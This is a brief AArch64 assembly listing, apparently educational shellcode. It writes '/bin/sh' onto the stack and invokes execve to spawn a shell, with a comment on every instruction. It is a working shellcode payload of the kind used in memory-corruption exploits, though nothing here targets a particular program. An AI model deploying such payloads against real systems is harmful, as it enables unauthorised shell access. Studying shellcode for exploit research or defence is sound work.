.section .text
.global _start
_start:
    // execve("/bin/sh", NULL, NULL)
    mov  x1, #0x622F            // x1 = 0x000000000000622F ("b/")
    movk x1, #0x6E69, lsl #16   // x1 = 0x000000006E69622F ("nib/")
    movk x1, #0x732F, lsl #32   // x1 = 0x0000732F6E69622F ("s/nib/")
    movk x1, #0x68, lsl #48     // x1 = 0x0068732F6E69622F ("hs/nib/")
    str  x1, [sp, #-8]!         // push x1
    mov  x0, sp                 // args[0] = pointer to "/bin/sh\0"
    mov  x1, xzr                // args[1] = NULL
    mov  x2, xzr                // args[2] = NULL
    mov  x8, #221               // Systemcall Number = 221 (execve)
    svc  #0                     // Invoke Systemcall
